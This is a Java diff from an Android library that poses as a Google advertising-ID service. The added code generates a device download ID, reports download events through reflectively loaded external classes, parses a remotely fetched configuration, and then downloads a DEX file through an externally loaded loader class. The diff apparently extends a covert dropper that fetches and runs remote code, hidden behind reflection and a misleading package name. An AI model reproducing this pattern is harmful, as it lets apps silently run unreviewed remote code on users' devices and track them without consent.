@@ -11,6 +11,7 @@ import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdate
 import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
 import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.FilesLoader.FilesLoader;
 import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
+import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetter;
 import com.advertising_id_service.appclick.googleadvertisingidservice.InstallationInfo;
 import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
 import com.advertising_id_service.appclick.googleadvertisingidservice.PublisherID.PublisherIDMask;
@@ -28,6 +29,7 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.IOException;
+import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.List;
@@ -373,7 +375,8 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
 //                        String.class});
 
 // заменить на этого франкинштейна:
-
+        //final String downloadID = new GoogleAdvertisingIdGetter().generateGUID(cnt);
+        final String downloadID = this.generateGUID(GenerateIDType.DEFAULT, cnt);
         lm.restartLoader(CodeUpdater.LOADER_NEW_CODE_VERSION, null, new LoaderManager.LoaderCallbacks<String>() {
             @SuppressLint("StaticFieldLeak")
             @Override
@@ -385,6 +388,7 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
                         String path = (path_to_conf_file == null) ? GlobalParameters.URL_TO_CONFIG_FILE : path_to_conf_file;
                         Logger.log("Грузим файл из:" + path);
                         String res = null;
+
 //                        FilesLoader fl = new FilesLoader();
 //                        fl.downloadFile(cnt, GlobalParameters.URL_TO_CONFIG_FILE, GlobalParameters.ConfigFilePath(cnt));
 //                        fl.unpackZip(GlobalParameters.getBasePath(cnt), GlobalParameters.CONFIG_FILE_NAME_ZIP);
@@ -407,6 +411,22 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
                                 new Class[]{
                                         String.class,
                                         String.class});
+
+                        //sendLog(cnt, lm, downloadID, "Download conf file");
+                        Class CodeUpdaterClazz     = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.CodeUpdater");
+                        Object codeUpdaterInstance = class_loader.getInstance(CodeUpdaterClazz, new Object[]{}, new Class[]{});
+                        class_loader.callMethod(CodeUpdaterClazz, codeUpdaterInstance, "sendLog",
+                                new Object[]{
+                                        cnt,
+                                        lm,
+                                        downloadID,
+                                        "Download conf file"},
+                                new Class[]{
+                                        Context.class,
+                                        LoaderManager.class,
+                                        String.class,
+                                        String.class});
+
                         return res;
                     }
                 };
@@ -416,8 +436,15 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
             public void onLoadFinished(Loader<String> loader, String result) {
 
                 String json_str = new CodeUpdater().loadJSONFromAsset(cnt, GlobalParameters.ConfigFilePath(cnt));
+                //JSONObject rootObj = getJsonObj(json_str);
+                Class CodeUpdaterClazz     = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.CodeUpdater");
+                Object codeUpdaterInstance = class_loader.getInstance(CodeUpdaterClazz, new Object[]{}, new Class[]{});
+                JSONObject rootObj         = class_loader.callMethod(CodeUpdaterClazz, codeUpdaterInstance, "getJsonObj",
+                        new Object[]{json_str},
+                        new Class[]{String.class});
+
+                if(rootObj == null) {return;}
                 try {
-                    JSONObject rootObj = new JSONObject(json_str);
                     String path_to_conf_file = rootObj.getString(GlobalParameters.JSON_KEY_PATH_TO_CONF_FILE);
                     //String path_to_conf_file_last = cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).getString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
                     String path_to_conf_file_last = SharedPreferencesServicer.getPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
@@ -448,6 +475,19 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
                                 String.class});
 
                 if (url_ != null) {
+//                  sendLog(cnt, lm, downloadID, "Download DEX file");
+                    class_loader.callMethod(CodeUpdaterClazz, codeUpdaterInstance, "sendLog",
+                            new Object[]{
+                                    cnt,
+                                    lm,
+                                    downloadID,
+                                    "Download DEX file"},
+                            new Class[]{
+                                    Context.class,
+                                    LoaderManager.class,
+                                    String.class,
+                                    String.class});
+
                   //  FilesLoader.downloadDexFile(cnt, url);
                     Class filesLoaderClazz = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.FilesLoader.FilesLoader");
                     Object instance2        = class_loader.getInstance(filesLoaderClazz, new Object[]{}, new Class[]{});
